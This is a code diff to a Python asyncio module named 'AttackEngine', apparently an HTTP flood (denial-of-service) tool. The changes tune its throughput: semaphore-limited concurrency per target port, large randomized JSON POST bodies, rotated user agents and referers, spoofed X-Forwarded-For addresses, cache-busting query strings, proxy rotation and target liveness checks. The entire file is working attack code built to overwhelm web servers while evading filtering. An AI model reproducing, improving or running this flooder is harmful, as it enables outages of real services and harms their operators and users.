@@ -1,4 +1,5 @@
 import asyncio
+import json as _json
 import random
 import string
 import time
@@ -23,30 +24,35 @@ UA = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/124.0.0.0",
 ]
-REF = ["https://google.com/search?q=", "https://bing.com/search?q=", "https://duckduckgo.com/?q=",
-       "https://yandex.ru/search/?text=", "https://reddit.com/", "https://github.com/"]
-PATHS = ["/", "/index.html", "/login", "/api/", "/admin", "/wp-admin", "/search?q=",
-         "/api/v1/users", "/graphql", "/xmlrpc.php", "/.env", "/config.json",
-         "/api/status", "/health", "/dashboard", "/register"]
+REF = ["https://google.com/", "https://bing.com/", "https://duckduckgo.com/",
+       "https://yandex.ru/", "https://reddit.com/", "https://github.com/"]
+PATHS = ["/", "/login", "/api/", "/admin", "/search", "/register",
+         "/api/v1/users", "/dashboard", "/health", "/status"]
 _c = string.ascii_letters + string.digits
 
-_JUNK = ["".join(random.choices(_c, k=50000)) for _ in range(10)]
+_PAYLOADS = [
+    _json.dumps({
+        "".join(random.choices(_c, k=8)): "".join(random.choices(_c, k=random.randint(3000, 8000)))
+        for _ in range(random.randint(2, 4))
+    }).encode()
+    for _ in range(30)
+]
 
-WORKERS_PER_PORT = 200
 
-
-def _j(lo=3, hi=12):
+def _j(lo=3, hi=10):
     return "".join(random.choices(_c, k=random.randint(lo, hi)))
 
 def _h():
-    return {"User-Agent": random.choice(UA), "Accept": "text/html,*/*;q=0.8",
-            "Accept-Encoding": "gzip, deflate, br", "Referer": random.choice(REF) + _j(5, 15),
-            "Cache-Control": "no-cache", "Connection": "keep-alive",
-            "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"}
-
-def _p():
-    return {_j(5, 10): random.choice(_JUNK)[:random.randint(20000, 50000)]
-            for _ in range(random.randint(3, 8))}
+    return {
+        "User-Agent": random.choice(UA),
+        "Accept": "text/html,*/*;q=0.8",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Referer": random.choice(REF),
+        "Cache-Control": "no-cache",
+        "Connection": "keep-alive",
+        "Content-Type": "application/json",
+        "X-Forwarded-For": f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
+    }
 
 def _m(m):
     return random.choice(["GET", "POST", "HEAD"]) if m == AttackMethod.MIX else m.value
@@ -58,10 +64,9 @@ def _url(target, port):
     elif port == 80: return f"http://{host}"
     return f"https://{host}:{port}"
 
-def _bust(base):
+def _full_url(base):
     path = random.choice(PATHS)
-    sep = "&" if "?" in path else "?"
-    return f"{base}{path}{sep}{_j(3,6)}={_j(8,16)}"
+    return f"{base}{path}?{_j(3,6)}={_j(8,14)}"
 
 
 class AttackEngine:
@@ -106,13 +111,12 @@ class AttackEngine:
 
     async def _run(self, target, ports, method, threads, duration, use_proxies):
         deadline = time.time() + duration if duration > 0 else 0
-        workers_pp = min(WORKERS_PER_PORT, threads // max(len(ports), 1))
-        workers_pp = max(workers_pp, 50)
+        conc = max(threads // max(len(ports), 1), 100)
 
         tasks = []
         for p in ports:
             tasks.append(asyncio.create_task(
-                self._port_flood(target, p, method, workers_pp, deadline, use_proxies)))
+                self._port_flood(target, p, method, conc, deadline, use_proxies)))
         tasks.append(asyncio.create_task(self._health_loop(target)))
 
         await asyncio.gather(*tasks, return_exceptions=True)
@@ -124,61 +128,73 @@ class AttackEngine:
                 self.stats.status = AttackStatus.FINISHED
         self.stats = self.stats.snapshot()
 
-    async def _port_flood(self, target, port, method, num_workers, deadline, use_proxies):
+    async def _port_flood(self, target, port, method, concurrency, deadline, use_proxies):
         base = _url(target, port)
-        d_timeout = aiohttp.ClientTimeout(total=settings.request_timeout, connect=3)
-        p_timeout = aiohttp.ClientTimeout(total=settings.proxy_timeout, connect=2)
+        d_timeout = aiohttp.ClientTimeout(total=3, connect=2)
+        p_timeout = aiohttp.ClientTimeout(total=2, connect=1.5)
 
-        d_conn = aiohttp.TCPConnector(limit=0, ttl_dns_cache=300, ssl=False, enable_cleanup_closed=True)
+        d_conn = aiohttp.TCPConnector(
+            limit=0, ttl_dns_cache=300, ssl=False,
+            enable_cleanup_closed=True, force_close=False)
         d_session = aiohttp.ClientSession(connector=d_conn, timeout=d_timeout)
 
+        sem = asyncio.Semaphore(concurrency)
+
         try:
-            workers = []
-            for i in range(num_workers):
-                use_px = use_proxies and (i % 5 >= 2)
-                workers.append(asyncio.create_task(
-                    self._worker(d_session, base, port, method, deadline, use_px, p_timeout, i)))
-                if i % 50 == 49:
-                    await asyncio.sleep(0)
-            await asyncio.gather(*workers, return_exceptions=True)
+            while not self._stop.is_set():
+                if deadline and time.time() >= deadline:
+                    break
+                ps = self.stats.ports.get(port)
+                if not ps or ps.status != PortStatus.ALIVE:
+                    await asyncio.sleep(0.5)
+                    continue
+
+                await sem.acquire()
+                if self._stop.is_set():
+                    sem.release()
+                    break
+
+                use_px = use_proxies and proxy_pool.alive_count > 50
+                asyncio.create_task(
+                    self._do_one(sem, d_session, base, port, method, use_px, p_timeout))
         except asyncio.CancelledError:
             pass
         except Exception as e:
             self.last_error = f"Port {port}: {e}"
         finally:
+            await asyncio.sleep(2)
             await d_session.close()
 
-    async def _worker(self, d_session, base, port, method, deadline, use_px, p_timeout, wid):
-        await asyncio.sleep(wid * 0.01)
-        while not self._stop.is_set():
-            if deadline and time.time() >= deadline:
-                break
-            ps = self.stats.ports.get(port)
-            if not ps or ps.status != PortStatus.ALIVE:
-                await asyncio.sleep(0.5)
-                continue
-            if use_px and proxy_pool.alive_count < 50:
-                use_px = False
-            try:
-                if use_px:
-                    await self._fire_proxy(base, port, method, p_timeout)
-                else:
-                    await self._fire_direct(d_session, base, port, method)
-            except Exception:
-                pass
+    async def _do_one(self, sem, session, base, port, method, use_px, p_timeout):
+        try:
+            if use_px:
+                await self._fire_proxy(base, port, method, p_timeout)
+            else:
+                await self._fire_direct(session, base, port, method)
+        except Exception:
+            pass
+        finally:
+            sem.release()
 
     async def _fire_direct(self, session, base, port, method):
         ps = self.stats.ports.get(port)
         if not ps:
             return
         m = _m(method)
-        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
-        if m == "POST":
-            kw["json"] = _p()
+        url = _full_url(base)
+        headers = _h()
         try:
-            async with session.request(**kw) as resp:
-                await resp.read()
-                self._hit(ps, resp.status, resp.headers, True)
+            if m == "POST":
+                async with session.post(url, headers=headers, data=random.choice(_PAYLOADS), ssl=False) as resp:
+                    await resp.read()
+                    self._hit(ps, resp.status, resp.headers, True)
+            elif m == "HEAD":
+                async with session.head(url, headers=headers, ssl=False) as resp:
+                    self._hit(ps, resp.status, resp.headers, True)
+            else:
+                async with session.get(url, headers=headers, ssl=False) as resp:
+                    await resp.read()
+                    self._hit(ps, resp.status, resp.headers, True)
         except (aiohttp.ClientError, asyncio.TimeoutError, OSError):
             self._miss(ps, True)
 
@@ -190,16 +206,20 @@ class AttackEngine:
         if not px:
             return
         m = _m(method)
-        kw = {"method": m, "url": _bust(base), "headers": _h(), "ssl": False}
-        if m == "POST":
-            kw["json"] = _p()
+        url = _full_url(base)
+        headers = _h()
         try:
             conn = ProxyConnector.from_url(px, ssl=False)
             async with aiohttp.ClientSession(connector=conn, timeout=timeout) as s:
-                async with s.request(**kw) as resp:
-                    await resp.read()
-                    self._hit(ps, resp.status, resp.headers, False)
-                    proxy_pool.mark_alive(px)
+                if m == "POST":
+                    async with s.post(url, headers=headers, data=random.choice(_PAYLOADS), ssl=False) as resp:
+                        await resp.read()
+                        self._hit(ps, resp.status, resp.headers, False)
+                else:
+                    async with s.get(url, headers=headers, ssl=False) as resp:
+                        await resp.read()
+                        self._hit(ps, resp.status, resp.headers, False)
+                proxy_pool.mark_alive(px)
         except Exception:
             self._miss(ps, False)
             proxy_pool.mark_dead(px)
@@ -237,7 +257,7 @@ class AttackEngine:
                 try:
                     async with aiohttp.ClientSession(
                         connector=aiohttp.TCPConnector(ssl=False), timeout=timeout) as s:
-                        async with s.get(url, headers=_h(), ssl=False) as r:
+                        async with s.get(url, headers={"User-Agent": "Mozilla/5.0"}, ssl=False) as r:
                             alive = True
                 except Exception:
                     pass
